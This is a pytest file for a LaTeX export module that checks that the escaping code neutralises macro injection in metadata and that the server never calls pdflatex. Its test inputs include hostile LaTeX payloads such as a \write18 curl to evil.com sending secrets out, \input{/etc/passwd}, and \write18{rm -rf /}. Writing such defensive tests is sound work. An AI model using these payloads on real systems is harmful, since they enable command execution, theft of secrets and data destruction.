"""
Tests for F-007: LaTeX Active Character Escaping and Export Safety.
Verifies that dynamic metadata injected into LaTeX templates is properly escaped
against LaTeX macro execution / pdflatex syntax corruption, while preserving intentional math mode expressions.
Also verifies server never executes pdflatex directly.
"""
import pytest
from app.science.export import (
    generate_nasa_latex_memorandum,
    latex_escape,
)


def test_latex_escape_special_characters():
    """Verify all 10 active LaTeX characters are properly escaped in non-math text."""
    raw = r"Data & Results: 50% #1 _test_ {bracket} ~tilde^ ^caret^ $100 \backslash"
    escaped = latex_escape(raw)

    assert r"\&" in escaped
    assert r"\%" in escaped
    assert r"\#" in escaped
    assert r"\_" in escaped
    assert r"\{bracket\}" in escaped
    assert r"\textasciitilde{}" in escaped
    assert r"\textasciicircum{}" in escaped
    assert r"\$100" in escaped
    assert r"\textbackslash{}" in escaped


def test_latex_injection_macro_neutralized():
    """Verify hostile LaTeX macro injection commands are safely rendered inert."""
    attacks = [
        r"\write18{curl evil.com/exfil?data=secret}",
        r"\input{/etc/passwd}",
        r"\def\malicious{exploit}",
        r"\immediate\write18{id}",
    ]
    for attack in attacks:
        escaped = latex_escape(attack)
        # Backslash must be escaped so it cannot execute as a TeX primitive
        assert r"\textbackslash{}" in escaped
        assert not escaped.startswith(r"\write18")
        assert not escaped.startswith(r"\input")
        assert not escaped.startswith(r"\immediate")


def test_latex_escape_preserves_valid_math():
    """Verify intentional LaTeX math expressions ($...$) remain intact."""
    text_with_math = r"Warming rate $\Delta T = +0.28^\circ\text{C}$ across 100% of cells"
    escaped = latex_escape(text_with_math)
    assert r"$\Delta T = +0.28^\circ\text{C}$" in escaped
    assert r"100\%" in escaped


def test_generate_nasa_latex_memorandum_escapes_hostile_metadata():
    """Verify full NASA TM export neutralizes attack strings in variable names and dataset IDs."""
    hostile_record = {
        "variable_name": r"T2M \write18{rm -rf /} & 50%_Anomaly",
        "units": r"deg_C / decade #1",
        "dataset_id": r"merra2_{evil}_dataset$100",
        "provenance": {
            "source": r"NASA \input{secret.env} & GMAO",
            "doi": r"10.5067/POWER_#test%20",
        },
        "results": {
            "cells": [{"slope": 0.25, "significant": True}]
        }
    }
    latex = generate_nasa_latex_memorandum(hostile_record, hmac_signature="test_sig_123")

    assert r"\textbackslash{}write18" in latex
    assert r"\& 50\%" in latex
    assert r"deg\_C" in latex
    assert r"\#1" in latex
    assert r"merra2\_\{evil\}\_dataset\$100" in latex
    assert r"\textbackslash{}input" in latex
    assert r"10.5067/POWER\_\#test\%20" in latex


def test_no_server_side_pdflatex_execution():
    """Verify server codebase exports LaTeX as source text and does not invoke pdflatex binaries."""
    import inspect
    from app.api.endpoints import export_analysis_latex

    source = inspect.getsource(export_analysis_latex)
    assert "pdflatex" not in source
    assert "subprocess" not in source
    assert "PlainTextResponse" in source
